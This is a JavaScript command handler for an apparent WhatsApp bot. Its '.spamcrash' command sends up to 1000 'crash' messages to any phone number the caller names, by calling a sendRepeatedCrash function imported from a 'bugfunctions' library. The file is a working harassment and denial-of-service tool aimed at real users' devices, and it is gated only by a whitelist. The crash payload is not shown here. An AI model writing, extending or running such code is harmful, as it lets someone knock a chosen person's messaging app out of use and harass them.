const { sendRepeatedCrash } = require('../lib/bugfunctions');
const {
  isWhitelisted,
  normalizeNumber,
  getText,
  getSender,
  toJid
} = require('../Utils/helper');

async function spamcrashCommand(sock, chatId, message) {
  try {
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ Private only command'
      }, { quoted: message });
    }

    const text = getText(message);
    const args = text.trim().split(/\s+/);

    const sender = getSender(message);

    if (!isWhitelisted(sender)) {
      return sock.sendMessage(chatId, {
        text: '❌ Not whitelisted'
      }, { quoted: message });
    }

    const count = parseInt(args[1]);
    let number = normalizeNumber(args[2]);

    if (!count || !number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .spamcrash 5 2547xxxxxxx'
      }, { quoted: message });
    }

    if (count > 1000) {
      return sock.sendMessage(chatId, {
        text: '❌ Max 1000 allowed'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `⏳ Sending ${count} crashes...`
    }, { quoted: message });

    await sendRepeatedCrash(sock, target, count);

    await sock.sendMessage(chatId, {
      text: `✅ Done`
    }, { quoted: message });

  } catch (e) {
    console.error(e);
  }
}

module.exports = spamcrashCommand;
